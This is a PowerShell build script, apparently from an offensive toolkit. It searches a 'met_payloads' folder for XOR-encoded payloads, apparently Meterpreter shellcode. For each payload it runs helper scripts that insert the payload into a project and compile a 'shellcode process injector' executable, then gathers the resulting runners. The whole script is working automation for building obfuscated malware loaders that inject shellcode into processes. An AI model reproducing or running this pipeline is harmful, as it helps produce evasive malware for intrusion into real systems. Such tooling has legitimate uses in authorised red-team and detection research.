param (
    [Parameter(Mandatory = $true)]
    [string]$TargetProjectFolder,

    [Parameter(Mandatory = $false)]
    [string]$XORPayloadFilePath
)

$runner_folder = "runner_executables"

# Remove old xor_met_payloads folder
if (Test-Path $runner_folder) {
    Remove-Item $runner_folder -Recurse -Force
    Write-Host "Folder '$runner_folder' has been deleted."
} else {
    Write-Host "Folder '$runner_folder' doesn't exist."
}

mkdir .\\$runner_folder
mkdir "./${runner_folder}/${TargetProjectFolder}"
$destination_runner_folder = "./${runner_folder}/${TargetProjectFolder}"

# Specify the folder path where you want to search for payloads
$met_payloads_path = "/met_payloads/"

# Get all files recursively
$files = Get-ChildItem -Path $met_payloads_path -Recurse -File

# Loop through each file
foreach ($file in $files) {
    # Check if the file name starts with "xor_"
    if ($file.Name -like "xor_*") {
        $XorPayloadPath = $file.FullName
        & './2.1_replace_payload_with_XOR_payload.ps1' $TargetProjectFolder $XorPayloadPath
        $outputFileString = & './2.2_compile_shellcode_process_injector.ps1' $TargetProjectFolder $XorPayloadPath
        Write-Host "Compiled $TargetProjectFolder executable with payload $XorPayloadPath"
        
        $outputFile = Get-ChildItem -Path $outputFileString[3] -File


        Move-Item -Path $outputFile -Destination $destination_runner_folder
        Write-Host "Moved $($outputFile.FullName) to ${destination_runner_folder.FullName}"
    }
}

$scriptName = $MyInvocation.MyCommand.Name
Write-Host "${scriptName} done!"